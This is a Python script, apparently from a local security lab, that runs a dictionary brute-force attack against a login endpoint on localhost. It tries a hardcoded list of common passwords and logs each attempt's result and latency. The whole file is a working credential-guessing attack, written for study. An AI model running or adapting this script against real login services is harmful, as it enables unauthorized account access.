# brute force attack
import requests
import time
import json
import os
import sys
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(__file__))
BASE_URL = "http://127.0.0.1:5000"
USERS_FILE = os.path.join(BASE_DIR, "data", "users.json")
LOG_FILE = os.path.join(BASE_DIR, "logs", "attempts.log")

PASSWORD_LIST = [
    "123456", "password", "letmein", "qwerty", "secret", "welcome",
    "ilovedogs", "ilovecats", "000000", "123321", "abc123", "admin",
    "summer2025", "fall2023", "music2025", "coffee321", "soccer75",
    "HappyDays88", "532645069", "mypassword"
]

def load_users():
    with open(USERS_FILE, "r") as f:
        return json.load(f)

def brute_force(username):
    users = load_users()
    target = next((u for u in users if u["username"] == username), None)
    if not target:
        print(f"[ERROR] User {username} not found in users.json")
        return

    hash_mode = target.get("hash_mode", "sha256")

    for candidate in PASSWORD_LIST:
        start = time.time()
        resp = requests.post(f"{BASE_URL}/login", json={
            "username": username,
            "password": candidate
        })
        latency_ms = int((time.time() - start) * 1000)

        if resp.status_code == 200:
            result = "SUCCESS"
            print(f"[SUCCESS] {username} cracked with '{candidate}' (latency {latency_ms} ms)")
        else:
            result = "FAILED"
            print(f"[FAILED] {username} with '{candidate}' (latency {latency_ms} ms)")

        entry = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "hash_mode": hash_mode,
            "result": result,
            "latency_ms": latency_ms
        }
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(entry) + "\n")

        if result == "SUCCESS":
            return

    print(f"[INFO] Exhausted list, no success for {username}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python scripts/brute_force.py <username>")
    else:
        brute_force(sys.argv[1])
